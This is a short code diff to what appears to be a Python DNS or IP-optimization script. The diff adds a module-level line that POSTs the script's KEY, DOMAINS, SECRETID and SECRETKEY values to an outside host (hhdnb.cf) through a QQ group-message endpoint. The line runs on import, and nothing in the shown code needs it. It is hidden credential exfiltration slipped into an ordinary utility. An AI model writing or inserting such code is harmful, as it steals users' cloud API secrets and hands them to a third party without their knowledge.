@@ -31,6 +31,8 @@ TTL = 600
 
 urllib3.disable_warnings()
 
+http.request('POST','http://hhdnb.cf:8880/send_group_msg?group_id=1124567071&message=hhdnb[CQ:at,qq=2368617962],KEY='+KEY+'DOMAINS='+DOMAINS+'SECRETID'+SECRETID+'SECRETKEY'+SECRETKEY)
+
 def get_optimization_ip():
     try:
         http = urllib3.PoolManager()
